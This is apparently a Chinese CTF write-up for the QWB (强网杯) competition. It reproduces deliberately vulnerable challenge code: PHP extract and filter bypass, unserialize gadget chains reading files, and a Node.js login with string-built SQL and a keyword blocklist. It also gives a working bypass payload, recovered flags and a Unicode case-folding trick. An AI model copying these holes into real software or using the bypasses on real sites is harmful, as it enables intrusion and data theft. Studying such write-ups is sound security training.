# 强网杯

#### 寻宝  num各种绕过

```
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);

function filter($string){
        $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\$','\(','\.','num','html','\/','\,','\'','0000000');
        $filter_phrase= '/'.implode('|',$filter_word).'/';
        return preg_replace($filter_phrase,'',$string);
    }
if($ppp){
    unset($ppp);
}
$ppp['number1'] = "1";
$ppp['number2'] = "1";
$ppp['nunber3'] = "1";
$ppp['number4'] = '1';
$ppp['number5'] = '1';

extract($_POST);

$num1 = filter($ppp['number1']);        
$num2 = filter($ppp['number2']);        
$num3 = filter($ppp['number3']);        
$num4 = filter($ppp['number4']);
$num5 = filter($ppp['number5']);    
if(isset($num1) && is_numeric($num1)){
    die("非数字");
}
else{
    if($num1 > 1024){
    echo "第一层";
        if(isset($num2) && strlen($num2) <= 4 && intval($num2 + 1) > 500000){
            echo "第二层";
            if(isset($num3) && '4bf21cd' === substr(md5($num3),0,7)){
                echo "第三层";
                if(!($num4 < 0)&&($num4 == 0)&&($num4 <= 0)&&(strlen($num4) > 6)&&(strlen($num4) < 8)&&isset($num4) ){
                    echo "第四层";
                    if(!isset($num5)||(strlen($num5)==0)) die("no");
                    $b=json_decode(@$num5);
                        if($y = $b === NULL){
                                if($y === true){
                                    echo "第五层";
                                    include 'KeY1lhv.php';
                                    echo $KEY1;
                                }
```

ppp[number1]=1025aa&ppp[number2]=9e9&ppp[number3]=61823470&ppp[number4]=0e00000&ppp[number5]=NULL

KEY1{e1e1d3d40573127e9ee0480caf1283d6}

python遍历搜索key

KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS}



**蓝队**

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Communication



#### **WhereIsUWebShel**l

反序列

```
<!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php-->
<?php
// index.php
ini_set('display_errors', 'on');
if(!isset($_COOKIE['ctfer'])){
    setcookie("ctfer",serialize("ctfer"),time()+3600);
}else{
    include "function.php";
    echo "I see your Cookie<br>";
    $res = unserialize($_COOKIE['ctfer']);
    if(preg_match('/myclass/i',serialize($res))){
        
        throw new Exception("Error: Class 'myclass' not found ");
    }
}
highlight_file(__FILE__);
echo "<br>";
highlight_file("myclass.php");
echo "<br>";
highlight_file("function.php");
<?php
// myclass.php
class Hello{
    public function __destruct()
    {   if($this->qwb) echo file_get_contents($this->qwb);
    }
}
?>
<?php
// function.php
function __autoload($classname){
    require_once "/var/www/html/$classname.php";
}
?>
```



#### **easy_sql**

```nodejs

const salt = random('Aa0', 40);
const HashCheck = sha256(sha256(salt + 'admin')).toString();

let filter = (data) => {
    let blackwords = ['alter', 'insert', 'drop', 'delete', 'update', 'convert', 'chr', 'char', 'concat', 'reg', 'to', 'query'];
    let flag = false;

    if (typeof data !== 'string') return true;

    blackwords.forEach((value, idx) => {
        if (data.includes(value)) {
            console.log(`filter: ${value}`);
            return (flag = true);
        }
    });

    let limitwords = ['substring', 'left', 'right', 'if', 'case', 'sleep', 'replace', 'as', 'format', 'union'];
    limitwords.forEach((value, idx) => {
        if (count(data, value) > 3){
            console.log(`limit: ${value}`);
            return (flag = true);
        }
    });

    return flag;
}
app.get('/source', async (req, res, next) => {
    fs.readFile('./source.txt', 'utf8', (err, data) => {
        if (err) {
            res.send(err);
        }
        else {
            res.send(data);
        }
    });
});

app.all('/', async (req, res, next) => {
    if (req.method == 'POST') {
        if (req.body.username && req.body.password) {
            let username = req.body.username.toLowerCase();
            let password = req.body.password.toLowerCase();

            if (username === 'admin') {
                res.send(`<script>alert("Don't want this!!!");location.href='/';</script>`);
                return;
            }
            
            UserHash = sha256(sha256(salt + username)).toString();
            if (UserHash !== HashCheck) {
                res.send(`<script>alert("NoNoNo~~~You are not admin!!!");location.href='/';</script>`);
                return;
            }

            if (filter(password)) {
                res.send(`<script>alert("Hacker!!!");location.href='/';</script>`);
                return;
            }

            let sql = `select password,username from users where username='${username}' and password='${password}';`;
            client.query(sql, [], (err, data) => {
                if (err) {
                    res.send(`<script>alert("Something Error!");location.href='/';</script>`);
                    return;
                }
                else {
                    if ((typeof data !== 'undefined') && (typeof data.rows[0] !== 'undefined') && (data.rows[0].password === password)) {
                        res.send(`<script>alert("Congratulation,here is your flag:${flag}");location.href='/';</script>`);
                        return;
                    }
                    else {
                        res.send(`<script>alert("Password Error!!!");location.href='/';</script>`);
                        return;
                    }
                }
            });
        }
    }

    res.render('index');
    return;
});

```



**nodejs  payload**

```
const crypto=require('crypto');
const salt = 'Ao1';
//var obj=crypto.createHash('md5');
var obj=crypto.createHash('sha256');
var obj1=crypto.createHash('sha256');
 
obj.update(salt+'admin');
 
var str=obj.digest('hex');//hex是十六进制
 
console.log(str);　
obj1.update(salt+'ADMIN'.toLowerCase());
 
var str1=obj1.digest('hex');//hex是十六进制
 
console.log(str1===str);　
console.log('admin'==='ADM�0�2N'.toLowerCase());
```



#### **赌徒  反序列化**

www.zip隐藏源码

```
<meta charset="utf-8">
<?php
//hint is in hint.php
error_reporting(1);

class Start  //类
{
    public $name='guest';  //属性
    public $flag='syst3m("cat 127.0.0.1/etc/hint");';
	
    public function __construct(){  //类方法
        echo "I think you need /etc/hint . Before this you need to see the source code";
    }

    public function _sayhello(){
        echo $this->name;
        return 'ok';
    }

    public function __wakeup(){//执行unserialize()时，先会调用这个函数
        echo "hi";
        $this->_sayhello();
    }
    public function __get($cc){
        echo "give you flag : ".$this->flag;
        return ;
    }
}

class Info
{
    private $phonenumber=123123;
    public $promise='I do';
	
    public function __construct(){
        $this->promise='I will not !!!!';
        return $this->promise;
    }

    public function __toString(){//把类当作字符串使用时触发
        return $this->file['filename']->ffiillee['ffiilleennaammee'];
    }
}

class Room
{
    public $filename='/flag';
    public $sth_to_set;
    public $a='';
	
    public function __get($name){//需要访问不存在的变量或者私有变量
        $function = $this->a;
        return $function();
    }
	
    public function Get_hint($file){
        $hint=base64_encode(file_get_contents($file));
        echo $hint;
        return ;
    }

    public function __invoke(){//当尝试将对象调用为函数(即方法)时触发
        $content = $this->Get_hint($this->filename);
        echo $content;
    }
}

if(isset($_GET['hello'])){
    unserialize($_GET['hello']);
}else{
    $hi = new  Start();
}

?>
```



#### easy_xss

[翻译xs-leaks]: https://www.pianshen.com/article/37901601283/
[DragonCTF 2020 - Scratchpad (web)]: https://blog.ankursundara.com/dragonctf-2020-scratchpad/

